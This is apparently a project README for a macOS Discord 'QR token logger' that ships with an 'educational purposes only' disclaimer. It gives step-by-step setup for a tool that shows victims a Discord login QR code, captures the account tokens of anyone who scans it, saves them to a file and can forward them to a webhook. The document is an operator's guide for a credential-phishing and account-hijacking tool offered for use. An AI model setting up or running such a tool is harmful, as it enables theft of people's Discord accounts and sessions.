# Discord-QR-Token-Logger-MacOS
Educational purposes only!
Credit: NightfallGT

# About
The QR Code will only last about two minutes after being generated. The QR Code must be scanned using the Discord app. The Scan QR Code feature can be found near Discord mobile settings.

# Install
1. Download the repository.
2. Download the version of Chrome Driver for your Chrome Browser. Check: chrome://version Download: https://chromedriver.chromium.org/downloads
3. Move the Chrome Driver into the same folder as the files. The current Chrome Driver that comes with the repository can be deleted, it is just a placeholder.
4. Hold down command, right click on the Chrome Driver, then click open. A terminal window will open up, once you see that it has started successfully, you can close it. You will only have to do this once.
5. Open up terminal and run ```pip3 install -r requirements.txt``` then run ```python3 qr.py```.
6. The image will be saved inside of the current folder. Tokens will be saved to the text file.
7. Optional: You can also add a webhook in the 10th line.

Still not working? Try this.
1. ```/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"```
2. ```brew install chromedriver```
